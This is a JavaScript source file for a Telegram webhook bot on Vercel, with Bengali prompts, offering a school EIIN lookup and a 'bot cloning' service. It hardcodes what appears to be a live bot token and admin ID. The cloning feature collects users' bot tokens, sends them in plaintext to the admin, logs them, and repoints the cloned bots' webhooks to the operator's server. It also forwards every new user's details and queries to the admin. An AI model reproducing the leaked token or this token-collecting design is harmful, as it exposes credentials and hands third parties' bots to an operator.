// api/bot.js
// ======================================
// 📱 Telegram Webhook Bot (Vercel)
// Main + Automatic Clone Webhook System
// ======================================

const MAIN_BOT_TOKEN = "8307228970:AAEmIyuDUcDEej6h17gv19ZeccSbIOkVAnk"; // Main bot token
const ADMIN_ID = "7915173083"; // Admin Chat ID
const CHANNEL_USERNAME = "@Xboomber"; // Channel username

// ------- Helper: get bot token from URL (?token=...) or fallback main -------
function getBotTokenFromReq(req) {
  // Vercel pages API: req.query থাকে
  const q = req.query || {};
  if (q.token && typeof q.token === "string" && q.token.length > 20) {
    return q.token;
  }

  // যদি উপরে না পায়, তাহলে url পার্স করে দেখবো (safety)
  try {
    if (req.url) {
      const base =
        "https://" +
        (req.headers["x-forwarded-host"] ||
          req.headers["host"] ||
          "example.com");
      const urlObj = new URL(req.url, base);
      const t = urlObj.searchParams.get("token");
      if (t && t.length > 20) return t;
    }
  } catch (e) {
    console.error("URL parse error:", e.message);
  }

  // Default: main bot
  return MAIN_BOT_TOKEN;
}

function getTelegramApi(token) {
  return `https://api.telegram.org/bot${token}`;
}

// ------------- Telegram helper functions -------------
async function callTelegram(token, method, payload) {
  try {
    const res = await fetch(`${getTelegramApi(token)}/${method}`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload),
    });
    const data = await res.json().catch(() => ({}));
    if (!data.ok) {
      console.error("Telegram call error:", method, data.description);
    }
    return data;
  } catch (e) {
    console.error("Telegram API error:", method, e.message);
    return { ok: false, description: e.message };
  }
}

async function sendMessage(token, chatId, text, extra = {}) {
  return callTelegram(token, "sendMessage", {
    chat_id: chatId,
    text,
    ...extra,
  });
}

async function answerCallbackQuery(token, callbackQueryId, extra = {}) {
  return callTelegram(token, "answerCallbackQuery", {
    callback_query_id: callbackQueryId,
    ...extra,
  });
}

async function getChatMember(token, chatId, userId) {
  try {
    const res = await fetch(`${getTelegramApi(token)}/getChatMember`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: chatId, user_id: userId }),
    });
    const data = await res.json();
    if (!data.ok) throw new Error(data.description || "getChatMember failed");
    return data.result;
  } catch (e) {
    console.error("getChatMember error:", e.message);
    return null;
  }
}

// ------------- EIIN API helper -------------
async function fetchEiinInfo(eiin) {
  const listUrl =
    `http://202.72.235.218:8082/api/v1/institute/list` +
    `?page=1&size=10&divisionCode=&districtCode=&thanaCode=` +
    `&instituteTypeId=&isGovt=&eiinNo=${encodeURIComponent(eiin)}`;

  const basicUrl =
    `http://202.72.235.218:8082/api/v1/basic-info-one/info` +
    `?eiinNo=${encodeURIComponent(eiin)}`;

  const [listRes, basicRes] = await Promise.all([
    fetch(listUrl),
    fetch(basicUrl),
  ]);

  const listData = await listRes.json();
  const basicData = await basicRes.json();
  return { listData, basicData };
}

// ======================================
// 🔘 Nice Main Menu Keyboard (Reply kb)
// ======================================
function getMainMenuKeyboard() {
  return {
    keyboard: [
      [{ text: "📚 EIIN TO INFO" }],
      [{ text: "🤖 Bot Cloning System" }],
      [{ text: "ℹ️ Help" }, { text: "👨‍💻 DEV" }],
    ],
    resize_keyboard: true,
    one_time_keyboard: false,
  };
}

// ------------- Admin notify -------------
async function notifyAdminNewUser(token, msg) {
  const u = msg.from || {};
  const text =
    "🆕 *New user started a bot*\n\n" +
    `🆔 ID: \`${u.id}\`\n` +
    `👤 Name: ${u.first_name || ""} ${u.last_name || ""}\n` +
    `🔗 Username: @${u.username || "N/A"}\n`;

  await sendMessage(token, ADMIN_ID, text, { parse_mode: "Markdown" });
}

// ------------- /start handler -------------
async function handleStart(botToken, message) {
  const chatId = message.chat.id;

  await notifyAdminNewUser(botToken, message);

  const welcomeText =
    "🎉 *Welcome to KingBoss EIIN & Bot System*\n\n" +
    "👉 প্রথমে নিচের Channel টি *Join* করুন,\n" +
    "তারপর EIIN INFO এবং BOT Cloning System ব্যবহার করতে পারবেন।";

  // Step 1: Show join inline buttons
  await sendMessage(botToken, chatId, welcomeText, {
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [
          { text: "✅ Join Channel", url: "https://t.me/xboomber" },
          { text: "☑️ Joined করেছি", callback_data: "check_join" },
        ],
        [{ text: "👨‍💻 DEV", callback_data: "dev_info" }],
      ],
    },
  });

  // Step 2: Show main reply keyboard (nice look)
  await sendMessage(
    botToken,
    chatId,
    "📲 *Main Menu* থেকে আপনার কাজ সিলেক্ট করুন:",
    {
      parse_mode: "Markdown",
      reply_markup: getMainMenuKeyboard(),
    }
  );
}

// ======================================
// 🔁 Clone: Automatic setWebhook for new token
// ======================================
async function setWebhookForToken(rawToken, req) {
  try {
    const host =
      req.headers["x-forwarded-host"] ||
      req.headers["host"] ||
      "your-vercel-domain.vercel.app";
    const proto = req.headers["x-forwarded-proto"] || "https";

    const webhookUrl =
      `${proto}://${host}/api/bot?token=` + encodeURIComponent(rawToken);

    console.log("Setting webhook for clone token:", rawToken, "URL:", webhookUrl);

    const res = await fetch(
      `https://api.telegram.org/bot${rawToken}/setWebhook`,
      {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          url: webhookUrl,
          allowed_updates: ["message", "callback_query"],
        }),
      }
    );

    const data = await res.json();
    console.log("setWebhook response:", data);

    if (!data.ok) {
      return {
        ok: false,
        description: data.description || "setWebhook failed",
        webhookUrl,
      };
    }

    return {
      ok: true,
      description: data.description || "Webhook was set",
      webhookUrl,
    };
  } catch (e) {
    console.error("setWebhookForToken error:", e.message);
    return { ok: false, description: e.message, webhookUrl: null };
  }
}

// ------------- Handle callback_query -------------
async function handleCallbackQuery(botToken, update, req) {
  const query = update.callback_query;
  const data = query.data;
  const from = query.from;
  const chatId = query.message.chat.id;

  // DEV info
  if (data === "dev_info") {
    await answerCallbackQuery(botToken, query.id);
    await sendMessage(
      botToken,
      chatId,
      "👨‍💻 *Developer Info*\n\n" +
        "Owner: @Bdkingboss\n" +
        "Channel: @Xboomber\n\n" +
        "💬 যে কোনো সমস্যায় Dev কে মেসেজ করুন।",
      {
        parse_mode: "Markdown",
      }
    );
    return;
  }

  // Check join
  if (data === "check_join") {
    const member = await getChatMember(botToken, CHANNEL_USERNAME, from.id);
    if (
      member &&
      ["member", "administrator", "creator"].includes(member.status)
    ) {
      await answerCallbackQuery(botToken, query.id, {
        text: "✔️ Joined Successful!",
        show_alert: false,
      });

      await sendMessage(
        botToken,
        chatId,
        "✅ *Channel Join সফল!* এখন নিচের অপশনগুলো ব্যবহার করতে পারবেন:",
        {
          parse_mode: "Markdown",
          reply_markup: {
            inline_keyboard: [
              [{ text: "📚 EIIN TO INFO", callback_data: "eiin_info" }],
              [{ text: "🤖 Bot Cloning System", callback_data: "clone_start" }],
              [{ text: "👨‍💻 DEV", callback_data: "dev_info" }],
            ],
          },
        }
      );

      await sendMessage(
        botToken,
        chatId,
        "📲 নিচের মেনু থেকে যে কোনো অপশন সিলেক্ট করুন:",
        {
          parse_mode: "Markdown",
          reply_markup: getMainMenuKeyboard(),
        }
      );
    } else {
      await answerCallbackQuery(botToken, query.id, {
        text: "❌ আগে Channel Join করুন: @xboomber",
        show_alert: true,
      });
    }
    return;
  }

  // EIIN inline
  if (data === "eiin_info") {
    await answerCallbackQuery(botToken, query.id);
    await sendMessage(
      botToken,
      chatId,
      "🔢 *আপনার EIIN নাম্বার পাঠান:*\n\nউদাহরণ: `123456`",
      {
        parse_mode: "Markdown",
        reply_markup: { force_reply: true },
      }
    );
    return;
  }

  // Clone inline
  if (data === "clone_start") {
    await answerCallbackQuery(botToken, query.id);
    await sendMessage(
      botToken,
      chatId,
      "🤖 *Bot Token পাঠান:*\n\nউদাহরণ: `1234567890:ABCDEFG...`",
      {
        parse_mode: "Markdown",
        reply_markup: { force_reply: true },
      }
    );
    return;
  }

  // ---- Approve / Cancel Clone ----
  if (data.startsWith("ok|") || data.startsWith("no|")) {
    // শুধু Admin ব্যবহার করতে পারবে
    if (String(from.id) !== String(ADMIN_ID)) {
      await answerCallbackQuery(botToken, query.id, {
        text: "❌ অনুমতি নেই (Admin only)",
        show_alert: true,
      });
      return;
    }

    const [action, userIdStr, encToken] = data.split("|");
    const targetUserId = userIdStr;
    const rawToken = decodeURIComponent(encToken || "");

    if (action === "no") {
      await answerCallbackQuery(botToken, query.id, {
        text: "❌ Clone Request Cancel করা হয়েছে",
        show_alert: false,
      });
      await sendMessage(
        botToken,
        targetUserId,
        "❌ আপনার Bot Clone Request Admin দ্বারা Cancel করা হয়েছে।"
      );
      return;
    }

    if (action === "ok") {
      await answerCallbackQuery(botToken, query.id, {
        text: "✅ Approving clone...",
        show_alert: false,
      });

      // 🔥 এখানে অটোমেটিক setWebhook করা হচ্ছে
      const result = await setWebhookForToken(rawToken, req);

      if (result.ok) {
        await sendMessage(
          botToken,
          ADMIN_ID,
          "✅ *Clone Approved & Webhook Set*\n\n" +
            `👤 User: \`${targetUserId}\`\n` +
            `🔑 Token: \`${rawToken}\`\n\n` +
            `🌐 Webhook URL:\n\`${result.webhookUrl}\``,
          { parse_mode: "Markdown" }
        );

        await sendMessage(
          botToken,
          targetUserId,
          "✅ *আপনার Bot সফলভাবে Clone করা হয়েছে!*\n\n" +
            "👉 এখন আপনার নতুন Bot এ গিয়ে `/start` পাঠান এবং বট ব্যবহার শুরু করুন।\n\n" +
            "আপনার Bot এর webhook সেট হয়েছে নিচের URL এ:\n" +
            `\`${result.webhookUrl}\``,
          { parse_mode: "Markdown" }
        );
      } else {
        // auto fail হলে manual setWebhook link পাঠাবো
        const fallbackUrl =
          result.webhookUrl ||
          (function () {
            const host =
              req.headers["x-forwarded-host"] ||
              req.headers["host"] ||
              "your-vercel-domain.vercel.app";
            const proto = req.headers["x-forwarded-proto"] || "https";
            return (
              `${proto}://${host}/api/bot?token=` +
              encodeURIComponent(rawToken)
            );
          })();

        const manualSetWebhookLink =
          `https://api.telegram.org/bot${rawToken}/setWebhook?url=` +
          encodeURIComponent(fallbackUrl);

        await sendMessage(
          botToken,
          ADMIN_ID,
          "⚠️ *Clone Approve হয়েছে কিন্তু setWebhook এ Error এসেছে:*\n\n" +
            `Token: \`${rawToken}\`\n` +
            `Error: ${result.description || "Unknown error"}\n\n` +
            "🔗 Manual setWebhook link:\n" +
            manualSetWebhookLink,
          { parse_mode: "Markdown" }
        );

        await sendMessage(
          botToken,
          targetUserId,
          "⚠️ *Clone Approve হয়েছে, কিন্তু Telegram এ webhook সেট করতে সমস্যা হয়েছে।*\n\n" +
            "👉 নিচের লিংকটা browser এ ওপেন করে একবার manually webhook সেট করে নিন, তারপর আপনার নতুন বট এ `/start` দিন:\n\n" +
            manualSetWebhookLink,
          { parse_mode: "Markdown" }
        );
      }
      return;
    }
  }
}

// ------------- Message handler -------------
async function handleMessage(botToken, update) {
  const msg = update.message;
  const chatId = msg.chat.id;
  const text = (msg.text || "").trim();

  // Commands
  if (text.startsWith("/start")) return handleStart(botToken, msg);

  if (text === "/menu") {
    await sendMessage(botToken, chatId, "📲 *Main Menu খুলে দেওয়া হয়েছে*", {
      parse_mode: "Markdown",
      reply_markup: getMainMenuKeyboard(),
    });
    return;
  }

  // Reply Keyboard buttons
  if (text === "📚 EIIN TO INFO") {
    await sendMessage(
      botToken,
      chatId,
      "🔢 *আপনার EIIN নাম্বার পাঠান:*\n\nউদাহরণ: `123456`",
      {
        parse_mode: "Markdown",
        reply_markup: { force_reply: true },
      }
    );
    return;
  }

  if (text === "🤖 Bot Cloning System") {
    await sendMessage(
      botToken,
      chatId,
      "🤖 *আপনার Bot Token পাঠান:*\n\nউদাহরণ: `1234567890:ABCDEFG...`",
      {
        parse_mode: "Markdown",
        reply_markup: { force_reply: true },
      }
    );
    return;
  }

  if (text === "👨‍💻 DEV") {
    await sendMessage(
      botToken,
      chatId,
      "👨‍💻 *Developer Info*\n\nOwner: @Bdkingboss\nChannel: @Xboomber",
      {
        parse_mode: "Markdown",
      }
    );
    return;
  }

  if (text === "ℹ️ Help") {
    await sendMessage(
      botToken,
      chatId,
      "ℹ️ *Help Menu*\n\n" +
        "1️⃣ Channel Join করে নিন\n" +
        "2️⃣ `📚 EIIN TO INFO` থেকে EIIN তথ্য নিন\n" +
        "3️⃣ `🤖 Bot Cloning System` থেকে Bot Token পাঠিয়ে Clone Request দিন\n\n" +
        "কোনো সমস্যা হলে `👨‍💻 DEV` বাটনে চাপুন।",
      { parse_mode: "Markdown" }
    );
    return;
  }

  // Force Reply handling (EIIN / TOKEN)
  if (msg.reply_to_message) {
    const parent = msg.reply_to_message.text || "";

    // EIIN
    if (parent.includes("EIIN")) {
      const eiin = text.trim();
      if (!eiin) {
        await sendMessage(botToken, chatId, "❗ সঠিক EIIN লিখে আবার পাঠান।");
        return;
      }

      const { listData, basicData } = await fetchEiinInfo(eiin);

      const output =
        `📚 *EIIN Info*\n\n` +
        `🔢 EIIN: \`${eiin}\`\n\n` +
        "```json\n" +
        JSON.stringify({ listData, basicData }, null, 2).slice(0, 3500) +
        "\n```";

      await sendMessage(botToken, chatId, output, { parse_mode: "Markdown" });

      await sendMessage(
        botToken,
        ADMIN_ID,
        `🆔 User EIIN দিয়েছে:\n${eiin}\n\n${output}`,
        { parse_mode: "Markdown" }
      );
      return;
    }

    // BOT TOKEN
    if (parent.includes("Bot Token")) {
      const tokenText = text.trim();
      if (!tokenText) {
        await sendMessage(botToken, chatId, "❗ সঠিক Bot Token পাঠান।");
        return;
      }

      const encToken = encodeURIComponent(tokenText);

      await sendMessage(
        botToken,
        ADMIN_ID,
        `🔔 *নতুন Clone Request*\n\n👤 User ID: \`${msg.from.id}\`\n🔑 Token: \`${tokenText}\``,
        {
          parse_mode: "Markdown",
          reply_markup: {
            inline_keyboard: [
              [
                {
                  text: "✅ Approve",
                  callback_data: `ok|${msg.from.id}|${encToken}`,
                },
                {
                  text: "❌ Cancel",
                  callback_data: `no|${msg.from.id}|${encToken}`,
                },
              ],
            ],
          },
        }
      );

      await sendMessage(
        botToken,
        chatId,
        "✅ *Token এডমিনের কাছে পাঠানো হয়েছে।*\nAdmin Approval এর জন্য অপেক্ষা করুন।",
        { parse_mode: "Markdown" }
      );
      return;
    }
  }

  // Fallback
  await sendMessage(
    botToken,
    chatId,
    "❓ কমান্ডটি বুঝতে পারিনি।\n\n`/menu` লিখে বা নিচের মেনু থেকে অপশন সিলেক্ট করুন।",
    {
      parse_mode: "Markdown",
      reply_markup: getMainMenuKeyboard(),
    }
  );
}

// ------------- Vercel Handler -------------
export default async function handler(req, res) {
  if (req.method !== "POST") return res.status(200).send("OK");

  const botToken = getBotTokenFromReq(req);
  const update = req.body || {};

  // শুধু লগ রাখার জন্য (debug help)
  console.log("Incoming update for token:", botToken, "type:", Object.keys(update));

  if (update.callback_query)
    await handleCallbackQuery(botToken, update, req);
  if (update.message) await handleMessage(botToken, update);

  res.status(200).json({ ok: true });
}
